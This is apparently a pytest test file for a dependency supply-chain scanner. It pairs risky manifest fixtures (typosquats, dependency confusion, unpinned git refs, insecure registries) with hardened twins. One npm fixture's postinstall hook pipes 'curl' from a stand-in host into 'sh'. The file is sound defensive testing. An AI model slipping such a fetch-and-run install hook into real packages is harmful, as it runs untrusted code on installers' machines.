"""Dependency supply-chain risk beyond CVEs (#247).

Each kind has npm / PyPI / Go fixtures (where the ecosystem has the
pattern) with a hardened negative twin. Fixtures are built in tmp_path so
the AttackMap self-scan isn't polluted by intentionally risky manifests.
"""

from __future__ import annotations

import json
import shutil
import socket
from pathlib import Path

import pytest

from attackmap import popular_packages, supply_chain
from attackmap.models import ScanResult, SupplyChainIssue
from attackmap.recon_to_analysis import translate_recon
from attackmap.scanner import scan_repo
from attackmap.supply_chain import _within_one_edit, scan_supply_chain
from attackmap.threat_model import rule_catalog

ROOT = Path(__file__).resolve().parents[1]
SHA = "8f4b7f84864484a7bf31766abe9204da3cbe65b3"
NPM_LOCK = json.dumps({"lockfileVersion": 3, "packages": {"": {}}})


def _write(root: Path, files: dict[str, str]) -> Path:
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return root


def _pkg(deps: dict, **extra) -> str:
    return json.dumps({"name": "app", "dependencies": deps, **extra})


# (kind, ecosystem, vulnerable files, hardened files)
CASES = [
    # dependency_confusion
    ("dependency_confusion", "pypi",
     {"requirements.txt": "--extra-index-url https://pypi.corp.example/simple\nacme-billing==1.2\n",
      ".attackmap.yaml": "internal_prefixes: [acme-]\n"},
     {"requirements.txt": "--index-url https://pypi.corp.example/simple\nacme-billing==1.2\n",
      ".attackmap.yaml": "internal_prefixes: [acme-]\n"}),
    ("dependency_confusion", "npm",
     {"package.json": json.dumps({"name": "@acme/web", "dependencies": {"acme-ui-kit": "1.0.0"}}),
      "package-lock.json": NPM_LOCK},
     {"package.json": json.dumps({"name": "@acme/web", "dependencies": {"@acme/ui-kit": "1.0.0"}}),
      "package-lock.json": NPM_LOCK,
      ".npmrc": "registry=https://npm.corp.example/\n@acme:registry=https://npm.corp.example/\n"}),
    # typosquat_candidate
    ("typosquat_candidate", "pypi",
     {"requirements.txt": "reqeusts==2.31.0\n"},
     {"requirements.txt": "requests==2.31.0\n"}),
    ("typosquat_candidate", "npm",
     {"package.json": _pkg({"expresss": "4.18.2"}), "package-lock.json": NPM_LOCK},
     {"package.json": _pkg({"express": "4.18.2"}), "package-lock.json": NPM_LOCK}),
    # mutable_vcs_dependency
    ("mutable_vcs_dependency", "pypi",
     {"requirements.txt": "mylib @ git+https://github.com/org/mylib.git@main\n"},
     {"requirements.txt": f"mylib @ git+https://github.com/org/mylib.git@{SHA}\n"}),
    ("mutable_vcs_dependency", "npm",
     {"package.json": _pkg({"left-pad": "github:user/left-pad"}), "package-lock.json": NPM_LOCK},
     {"package.json": _pkg({"left-pad": f"github:user/left-pad#{SHA}"}), "package-lock.json": NPM_LOCK}),
    ("mutable_vcs_dependency", "go",
     {"go.mod": "module example.com/app\n\ngo 1.22\n\nrequire github.com/pkg/errors v0.9.1\n\n"
                "replace github.com/pkg/errors => ../../outside/errors\n"},
     {"go.mod": "module example.com/app\n\ngo 1.22\n\nrequire example.com/app/lib v0.0.0\n\n"
                "replace example.com/app/lib => ./lib\n"}),
    # install_script
    ("install_script", "npm",
     {"package.json": _pkg({"esbuild": "0.20.0"}, scripts={"postinstall": "curl -fsSL https://x.example/i.sh | sh"}),
      "package-lock.json": json.dumps({"lockfileVersion": 3, "packages": {
          "": {"dependencies": {"esbuild": "0.20.0"}},
          "node_modules/esbuild": {"version": "0.20.0", "resolved": "https://registry.npmjs.org/esbuild/-/esbuild-0.20.0.tgz",
                                   "integrity": "sha512-x", "hasInstallScript": True}}})},
     {"package.json": _pkg({"lodash": "4.17.21"}, scripts={"postinstall": "node scripts/setup.js"}),
      "package-lock.json": json.dumps({"lockfileVersion": 3, "packages": {
          "": {"dependencies": {"lodash": "4.17.21"}},
          "node_modules/lodash": {"version": "4.17.21", "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
                                  "integrity": "sha512-y"}}})}),
    # unlocked_manifest
    ("unlocked_manifest", "npm",
     {"package.json": _pkg({"lodash": "^4.17.21"})},
     {"package.json": _pkg({"lodash": "^4.17.21"}), "package-lock.json": NPM_LOCK}),
    ("unlocked_manifest", "npm",  # lockfile entries without integrity
     {"package.json": _pkg({"lodash": "4.17.21"}),
      "package-lock.json": json.dumps({"lockfileVersion": 3, "packages": {
          "": {"dependencies": {"lodash": "4.17.21"}},
          "node_modules/lodash": {"version": "4.17.21", "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz"}}})},
     {"package.json": _pkg({"lodash": "4.17.21"}),
      "package-lock.json": json.dumps({"lockfileVersion": 3, "packages": {
          "": {"dependencies": {"lodash": "4.17.21"}},
          "node_modules/lodash": {"version": "4.17.21", "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
                                  "integrity": "sha512-z"}}})}),
    ("unlocked_manifest", "pypi",
     {"Pipfile": "[packages]\nrequests = \"*\"\n"},
     {"Pipfile": "[packages]\nrequests = \"*\"\n", "Pipfile.lock": "{}"}),
    # insecure_registry
    ("insecure_registry", "pypi",
     {"requirements.txt": "--index-url http://pypi.corp.example/simple\nrequests==2.31.0\n"},
     {"requirements.txt": "--index-url https://pypi.corp.example/simple\nrequests==2.31.0\n"}),
    ("insecure_registry", "npm",
     {".npmrc": "registry=http://npm.corp.example/\nstrict-ssl=false\n", "package.json": _pkg({}),
      "package-lock.json": NPM_LOCK},
     {".npmrc": "registry=https://npm.corp.example/\n", "package.json": _pkg({}), "package-lock.json": NPM_LOCK}),
]
IDS = [f"{k}-{e}-{i}" for i, (k, e, _, _) in enumerate(CASES)]


@pytest.mark.parametrize(("kind", "eco", "vulnerable", "hardened"), CASES, ids=IDS)
def test_vulnerable_fixture_fires(tmp_path: Path, kind: str, eco: str, vulnerable: dict, hardened: dict) -> None:
    issues = scan_supply_chain(_write(tmp_path, vulnerable))
    assert any(i.kind == kind and (i.ecosystem in {eco, None}) for i in issues), [(i.kind, i.evidence_text) for i in issues]


@pytest.mark.parametrize(("kind", "eco", "vulnerable", "hardened"), CASES, ids=IDS)
def test_hardened_twin_is_clean(tmp_path: Path, kind: str, eco: str, vulnerable: dict, hardened: dict) -> None:
    issues = scan_supply_chain(_write(tmp_path, hardened))
    assert issues == [], [(i.kind, i.evidence_text) for i in issues]


def test_typosquat_requests_example(tmp_path: Path) -> None:
    flagged = scan_supply_chain(_write(tmp_path / "a", {"requirements.txt": "reqeusts\n"}))
    assert [(i.kind, i.package) for i in flagged] == [("typosquat_candidate", "reqeusts")]
    assert "requests" in flagged[0].evidence_text
    assert scan_supply_chain(_write(tmp_path / "b", {"requirements.txt": "requests\n"})) == []


def test_typosquat_skips_short_and_popular_near_twins(tmp_path: Path) -> None:
    # boto vs boto3 / scipy vs scapy are both popular; short names are skipped.
    reqs = "boto\nscapy\nattr\n"
    assert scan_supply_chain(_write(tmp_path, {"requirements.txt": reqs})) == []


def test_within_one_edit() -> None:
    assert _within_one_edit("reqeusts", "requests")  # transposition
    assert _within_one_edit("requets", "requests")  # deletion
    assert _within_one_edit("requestss", "requests")  # insertion
    assert _within_one_edit("requezts", "requests")  # substitution
    assert not _within_one_edit("requests", "requests")
    assert not _within_one_edit("rqeuests", "requests2")


def test_popular_list_is_versioned_offline_and_small() -> None:
    assert popular_packages.POPULAR_PACKAGES_VERSION
    assert "requests" in popular_packages.PYPI and "express" in popular_packages.NPM
    assert Path(popular_packages.__file__).stat().st_size < 200_000


def test_extra_index_url_alone_is_low_confusion(tmp_path: Path) -> None:
    issues = scan_supply_chain(_write(tmp_path, {
        "requirements.txt": "--extra-index-url https://pypi.corp.example/simple\nrequests==2.31.0\n"}))
    assert [(i.kind, i.severity) for i in issues] == [("dependency_confusion", "low")]


def test_generic_internal_name_on_public_npm_is_not_flagged(tmp_path: Path) -> None:
    # `internal-ip` is a real public package; without a private registry or a
    # configured prefix there's nothing to confuse it with.
    issues = scan_supply_chain(_write(tmp_path, {
        "package.json": _pkg({"internal-ip": "8.0.0"}), "package-lock.json": NPM_LOCK}))
    assert issues == []


def test_cargo_and_poetry_git_without_rev(tmp_path: Path) -> None:
    _write(tmp_path, {
        "Cargo.toml": '[package]\nname = "a"\n\n[dependencies]\nserde = { git = "https://github.com/serde-rs/serde", branch = "master" }\n',
        "pyproject.toml": '[tool.poetry.dependencies]\nfoo = { git = "https://github.com/org/foo.git", tag = "v1" }\n'
                          f'bar = {{ git = "https://github.com/org/bar.git", rev = "{SHA}" }}\n',
    })
    got = sorted((i.ecosystem, i.package) for i in scan_supply_chain(tmp_path) if i.kind == "mutable_vcs_dependency")
    assert got == [("cargo", "serde"), ("pypi", "foo")]


def test_requirements_git_line_is_not_a_dependency_named_git(tmp_path: Path) -> None:
    from attackmap.sbom import analyze_sbom

    _write(tmp_path, {"requirements.txt": "git+https://github.com/org/lib.git@main#egg=lib\n"})
    assert [d.name for d in analyze_sbom(tmp_path)] == []
    assert [i.kind for i in scan_supply_chain(tmp_path)] == ["mutable_vcs_dependency"]


def test_self_scan_flags_unpinned_git_extras_only_when_unpinned(tmp_path: Path) -> None:
    # AttackMap's own [all] extra pins every plugin to a commit (#237): clean.
    assert [i for i in scan_supply_chain(ROOT) if i.file == "pyproject.toml"] == []
    # The pattern it used to ship (a moving git ref) is flagged.
    shutil.copyfile(ROOT / "pyproject.toml", tmp_path / "pyproject.toml")
    text = (tmp_path / "pyproject.toml").read_text(encoding="utf-8")
    first = text.index(".git@") + len(".git@")
    (tmp_path / "pyproject.toml").write_text(text[:first] + "main" + text[first + 40:], encoding="utf-8")
    issues = scan_supply_chain(tmp_path)
    assert [i.kind for i in issues] == ["mutable_vcs_dependency"]
    assert issues[0].package == "attackmap-analyzer-python"


def test_no_network_io(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    def guard(*_a, **_k):
        raise AssertionError("network I/O attempted")

    monkeypatch.setattr(socket, "socket", guard)
    monkeypatch.setattr(socket, "create_connection", guard)
    monkeypatch.setattr(socket, "getaddrinfo", guard)
    for i, (_, _, vulnerable, _) in enumerate(CASES):
        _write(tmp_path / str(i), vulnerable)
    scan = scan_repo(tmp_path)
    assert scan.supply_chain_issues
    translate_recon(scan)


def test_findings_are_catalogued_and_synthesized(tmp_path: Path) -> None:
    catalog = {r for r, _, _ in rule_catalog()}
    kinds = SupplyChainIssue.model_fields["kind"].annotation.__args__
    assert {k.replace("_", "-") for k in kinds} <= catalog
    _write(tmp_path, {"requirements.txt": "--index-url http://pypi.corp.example/simple\nreqeusts==2.31\n"})
    findings = translate_recon(scan_repo(tmp_path)).findings
    by_rule = {f.rule_id: f for f in findings}
    assert by_rule["insecure-registry"].severity == "high"
    assert "typosquat-candidate" in by_rule
    assert all("supply-chain" in by_rule[r].tags for r in ("insecure-registry", "typosquat-candidate"))


def test_risky_dependency_on_taint_path_amplifies_exploitability(tmp_path: Path) -> None:
    from attackmap.exploitability import _supply_chain_index

    scan = ScanResult(root=str(tmp_path), supply_chain_issues=[
        SupplyChainIssue(kind="typosquat_candidate", file="requirements.txt", package="Reqeusts",
                         ecosystem="pypi", severity="medium")])
    assert _supply_chain_index(scan) == {"reqeusts": ("medium", ["typosquat_candidate"])}


def test_supply_chain_module_has_no_network_imports() -> None:
    source = Path(supply_chain.__file__).read_text(encoding="utf-8")
    for banned in ("urllib", "http.client", "requests", "socket"):
        assert f"import {banned}" not in source and f"from {banned}" not in source


def test_test_fixture_manifests_are_not_reported(tmp_path: Path) -> None:
    fixture = tmp_path / "tests" / "fixtures" / "app"
    fixture.mkdir(parents=True)
    (fixture / "package.json").write_text('{"dependencies": {"expresss": "^4.0.0"}}')
    (tmp_path / "package.json").write_text('{"name": "x", "dependencies": {}}')
    issues = scan_supply_chain(tmp_path)
    assert not any(i.file.startswith("tests/") for i in issues), [(i.kind, i.file) for i in issues]
